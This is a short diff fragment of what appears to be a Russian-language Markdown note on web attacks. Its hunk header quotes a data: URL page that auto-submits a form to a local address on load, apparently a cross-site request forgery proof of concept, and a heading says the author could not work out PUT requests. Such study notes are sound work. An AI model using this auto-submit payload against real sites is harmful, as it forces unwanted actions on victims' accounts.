@@ -30,4 +30,3 @@ data:text/html,<body onload="document.forms[0].submit()"><form action='http://lo
 ```
 
 ### Как сделть PUT запрос я не разобрался
-
